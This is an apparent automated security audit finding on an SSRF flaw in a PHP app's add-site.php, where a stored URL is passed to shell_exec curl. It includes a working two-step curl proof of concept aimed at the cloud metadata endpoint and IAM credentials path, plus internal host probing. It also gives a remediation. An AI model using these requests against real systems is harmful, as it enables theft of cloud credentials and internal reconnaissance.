# Vulnerability: SSRF — curl to Internal Services via Stored URL

## Summary
The `shell_exec("time curl -I " . $site)` call in `user/add-site.php:15-16` allows an authenticated user to make the server issue HTTP requests to arbitrary hosts, including internal services. An attacker stores a URL targeting internal infrastructure (e.g., `http://169.254.169.254/latest/meta-data/` for cloud metadata or `http://lazyweb-db:3306` for the internal MySQL instance) and triggers the "ping" action. The server-side `curl` request originates from within the Docker network, granting access to services not reachable from the public internet.

## Confidence
High

## Authentication Requirement
Authenticated (Low Privilege)

## Attack Surface Location
- **Endpoint:** `GET/POST /user/add-site.php`
- **Handler:** `user/add-site.php:1-42`
- **Middleware / Guards:** AumWAF, `isAuth()` check

## Attack Chain
1. **Initial access:** Attacker authenticates as any registered user.
2. **Endpoint interaction:** Attacker submits a POST request to `/user/add-site.php` with a URL targeting an internal service.
3. **Malicious input:** The URL `http://169.254.169.254/latest/meta-data/` (AWS cloud metadata) or `http://lazyweb-db:3306` (internal MySQL) is stored in `tbl_sites`.
4. **Sink execution:** Attacker navigates to `GET /user/add-site.php?ping=1&id=<site_id>`. The code retrieves the URL from DB (line 14), constructs `"time curl -I http://169.254.169.254/latest/meta-data/"` (line 15), and executes it via `shell_exec()` (line 16). The curl request originates from inside the Docker network.
5. **Post-exploitation:** The HTTP response headers are returned to the user via the `cmdout` Smarty variable (line 17). The attacker can probe internal services, enumerate cloud metadata endpoints, and fingerprint internal infrastructure.
6. **Final impact:** SSRF to internal services and cloud metadata endpoints. In AWS environments, the attacker can retrieve IAM credentials from `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

## Data Flow
- **Source (user input):** `POST url` parameter — `$_POST['url']` via `post('url')` function.
- **Sink:** `shell_exec($cmd)` at `user/add-site.php:16`, where `$cmd` includes a curl request to the user-controlled URL.

```
post('url') → mysqli->query("INSERT...") [user/add-site.php:21] → DB storage → mysqli->query("SELECT...") [user/add-site.php:14] → fetch_object()->url [user/add-site.php:14] → string concat into curl command [user/add-site.php:15] → shell_exec() [user/add-site.php:16]
```

## Proof of Concept

### Prerequisites
- Authenticated user account (any registered user).

### Exploit Request

```bash
# Step 1: Store SSRF payload URL
curl -X POST 'http://{{TARGET_HOST}}/user/add-site.php' \
  -b 'PHPSESSID={{AUTH_TOKEN}}' \
  -d 'url=http://169.254.169.254/latest/meta-data/'

# Step 2: Trigger SSRF via ping
curl 'http://{{TARGET_HOST}}/user/add-site.php?ping=1&id=1' \
  -b 'PHPSESSID={{AUTH_TOKEN}}'
```

### Expected Vulnerable Response
```http
HTTP/1.1 200 OK

... <div class="well">HTTP/1.1 200 OK
Content-Type: text/html
...
ami-id
ami-launch-index
...</div> ...
```

### Expected Patched Response
```http
HTTP/1.1 200 OK

... <div class="well">Error: URL targets an internal or disallowed host.</div> ...
```

### Impact Demonstration
The attacker can:
- **Enumerate cloud metadata:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to discover IAM roles
- **Probe internal services:** `http://lazyweb-db:3306` to confirm MySQL is running
- **Scan the Docker network:** Iterate through IP ranges to discover other containers

## Affected Code
```php
// user/add-site.php:13-17
if( get('ping') ) {
	$site = $mysqli->query("SELECT * FROM tbl_sites WHERE id = " . intval(get('id')))->fetch_object()->url;
	$cmd = "time curl -I " . $site;
	$out = shell_exec($cmd);
	$smarty->assign('cmdout', nl2br($out));
}
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** The sink at `user/add-site.php:16` is reachable from external HTTP requests. The endpoint is guarded by `isAuth()`. AumWAF does not block IP addresses or hostnames.
- **Impact attack — FAILED to kill.** SSRF is explicitly in-scope. The curl command with `-I` performs a HEAD request, returning HTTP headers from the target.
- **Validity attack — FAILED to kill.** No URL validation exists in the codebase. No `filter_var()`, no scheme allowlist, no host blocklist.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Validate URLs before storage and use PHP curl instead of shell_exec:
```php
if(isPost()) {
    $url = filter_var(post('url'), FILTER_VALIDATE_URL);
    if ($url === false) { die('Invalid URL'); }
    $parsed = parse_url($url);
    $ip = gethostbyname($parsed['host']);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        die('URL targets a private or reserved IP range');
    }
    $mysqli->query("INSERT INTO tbl_sites (user_id, url) VALUES (" . intval(cookie('user_id')) . ", '" . $mysqli->real_escape_string($url) . "')");
}
```